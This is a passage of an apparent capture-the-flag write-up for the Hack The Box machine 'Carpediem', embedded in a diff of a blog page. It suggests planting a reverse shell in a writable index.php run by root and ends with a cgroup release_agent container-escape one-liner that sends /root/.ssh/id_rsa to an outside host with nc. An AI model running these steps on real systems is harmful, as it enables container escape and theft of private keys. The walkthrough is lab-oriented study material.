+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>status<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>php /var/www/html/backdrop/core/scripts/backdrop.sh --root /var/www/html/backdrop https://localhost<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>grep <span style="color:#e6db74">&#34;Welcome to backdrop.carpediem.htb!&#34;</span> <span style="color:#e6db74">&#34;</span>$status<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;</span>$?<span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#something went wrong.  restoring from backup.</span>
+</span></span><span style="display:flex;"><span>        cp /root/index.php /var/www/html/backdrop/index.php
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span></code></pre></div><ul>
+<li>we can exploit this by create a index.php with our reverse shell in /var/www/html/backdrop folder, which we can write to. After a while, we can receive the reverse shell connection</li>
+<li>/var/www/html/backdrop/core/scripts/backdrop.sh</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Backdrop shell execution script
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Check for your PHP interpreter - on Windows you&#39;ll probably have to
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * replace line 1 with
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> *   #!c:/program files/php/php.exe
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * @param path  Backdrop&#39;s absolute root directory in local file system (optional).
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * @param URI   A URI to execute, including HTTP protocol prefix.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> */</span>
+</span></span><span style="display:flex;"><span>$script <span style="color:#f92672">=</span> <span style="color:#a6e22e">basename</span>(<span style="color:#a6e22e">array_shift</span>($_SERVER[<span style="color:#e6db74">&#39;argv&#39;</span>]));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>(<span style="color:#e6db74">&#39;--help&#39;</span>, $_SERVER[<span style="color:#e6db74">&#39;argv&#39;</span>]) <span style="color:#f92672">||</span> <span style="color:#66d9ef">empty</span>($_SERVER[<span style="color:#e6db74">&#39;argv&#39;</span>])) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> <span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Execute</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">Backdrop</span> <span style="color:#a6e22e">page</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">shell</span><span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Usage</span><span style="color:#f92672">:</span>        {$script} [<span style="color:#a6e22e">OPTIONS</span>] <span style="color:#e6db74">&#34;&lt;URI&gt;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Example</span><span style="color:#f92672">:</span>      {$script} <span style="color:#e6db74">&#34;http://mysite.org/node&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">All</span> <span style="color:#a6e22e">arguments</span> <span style="color:#a6e22e">are</span> <span style="color:#a6e22e">long</span> <span style="color:#a6e22e">options</span><span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">--</span><span style="color:#a6e22e">help</span>      <span style="color:#66d9ef">This</span> <span style="color:#a6e22e">page</span><span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">--</span><span style="color:#a6e22e">root</span>      <span style="color:#a6e22e">Set</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">working</span> <span style="color:#a6e22e">directory</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">script</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">specified</span> <span style="color:#a6e22e">path</span><span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">To</span> <span style="color:#a6e22e">execute</span> <span style="color:#a6e22e">Backdrop</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">has</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">be</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">root</span> <span style="color:#a6e22e">directory</span> <span style="color:#a6e22e">of</span> <span style="color:#a6e22e">your</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">Backdrop</span> <span style="color:#a6e22e">installation</span>, <span style="color:#a6e22e">f</span><span style="color:#f92672">.</span><span style="color:#a6e22e">e</span><span style="color:#f92672">.</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">home</span><span style="color:#f92672">/</span><span style="color:#a6e22e">www</span><span style="color:#f92672">/</span><span style="color:#a6e22e">foo</span><span style="color:#f92672">/</span><span style="color:#a6e22e">backdrop</span> (<span style="color:#a6e22e">assuming</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">Backdrop</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">running</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">Unix</span>)<span style="color:#f92672">.</span> <span style="color:#a6e22e">Current</span> <span style="color:#a6e22e">directory</span> <span style="color:#a6e22e">is</span> <span style="color:#66d9ef">not</span> <span style="color:#a6e22e">required</span><span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">Use</span> <span style="color:#a6e22e">surrounding</span> <span style="color:#a6e22e">quotation</span> <span style="color:#a6e22e">marks</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">Windows</span><span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">--</span><span style="color:#a6e22e">verbose</span>   <span style="color:#66d9ef">This</span> <span style="color:#a6e22e">option</span> <span style="color:#a6e22e">displays</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">options</span> <span style="color:#66d9ef">as</span> <span style="color:#a6e22e">they</span> <span style="color:#a6e22e">are</span> <span style="color:#a6e22e">set</span>, <span style="color:#a6e22e">but</span> <span style="color:#a6e22e">will</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">produce</span> <span style="color:#a6e22e">errors</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">setting</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">session</span><span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">URI</span>         <span style="color:#a6e22e">The</span> <span style="color:#a6e22e">URI</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">execute</span>, <span style="color:#a6e22e">i</span><span style="color:#f92672">.</span><span style="color:#a6e22e">e</span><span style="color:#f92672">.</span> <span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#66d9ef">default</span><span style="color:#f92672">/</span><span style="color:#a6e22e">foo</span><span style="color:#f92672">/</span><span style="color:#a6e22e">bar</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">executing</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">path</span> <span style="color:#e6db74">&#39;/foo/bar&#39;</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">your</span> <span style="color:#a6e22e">site</span> <span style="color:#e6db74">&#39;default&#39;</span><span style="color:#f92672">.</span> <span style="color:#a6e22e">URI</span> <span style="color:#a6e22e">has</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">be</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">enclosed</span> <span style="color:#a6e22e">by</span> <span style="color:#a6e22e">quotation</span> <span style="color:#a6e22e">marks</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">there</span> <span style="color:#a6e22e">are</span> <span style="color:#a6e22e">ampersands</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">it</span>
+</span></span><span style="display:flex;"><span>              (<span style="color:#a6e22e">f</span><span style="color:#f92672">.</span><span style="color:#a6e22e">e</span><span style="color:#f92672">.</span> <span style="color:#a6e22e">index</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span><span style="color:#f92672">?</span><span style="color:#a6e22e">q</span><span style="color:#f92672">=</span><span style="color:#a6e22e">node</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">foo</span><span style="color:#f92672">=</span><span style="color:#a6e22e">bar</span>)<span style="color:#f92672">.</span> <span style="color:#a6e22e">Prefix</span> <span style="color:#e6db74">&#39;http://&#39;</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">required</span>,
+</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">and</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">domain</span> <span style="color:#a6e22e">must</span> <span style="color:#a6e22e">exist</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">Backdrop</span><span style="color:#e6db74">&#39;s sites-directory.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              If the given path and file exists it will be executed directly,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              i.e. if URI is set to http://default/bar/foo.php
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              and bar/foo.php exists, this script will be executed without
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              bootstrapping Backdrop. To execute Backdrop&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">cron</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>, <span style="color:#a6e22e">specify</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#66d9ef">default</span><span style="color:#f92672">/</span><span style="color:#a6e22e">core</span><span style="color:#f92672">/</span><span style="color:#a6e22e">cron</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">as</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">URI</span><span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">To</span> <span style="color:#a6e22e">run</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">script</span> <span style="color:#a6e22e">without</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">root</span> <span style="color:#a6e22e">argument</span> <span style="color:#a6e22e">invoke</span> <span style="color:#a6e22e">it</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">root</span> <span style="color:#a6e22e">directory</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">of</span> <span style="color:#a6e22e">your</span> <span style="color:#a6e22e">Backdrop</span> <span style="color:#a6e22e">installation</span> <span style="color:#a6e22e">with</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">./</span><span style="color:#a6e22e">scripts</span><span style="color:#f92672">/</span>{$script}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">\n</span>
+</span></span></code></pre></div><ul>
+<li>Read: <a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/</a></li>
+<li>create a new instance of session to avoid permission issues</li>
+</ul>
+<pre tabindex="0"><code>&gt; unshare -UrmC bash
+&gt; umount /tmp/cgrp &amp;&amp; rm -r /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x &amp;&amp; echo 1 &gt; /tmp/cgrp/x/notify_on_release &amp;&amp; host_path=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab` &amp;&amp; echo &#34;$host_path/cmd&#34; &gt; /tmp/cgrp/release_agent &amp;&amp; echo &#39;#!/bin/sh&#39; &gt; /cmd &amp;&amp; echo &#34;nc 10.10.16.27 6666 &lt; /root/.ssh/id_rsa&#34; &gt;&gt; /cmd &amp;&amp; chmod a+x /cmd &amp;&amp; sh -c &#34;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&#34;
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
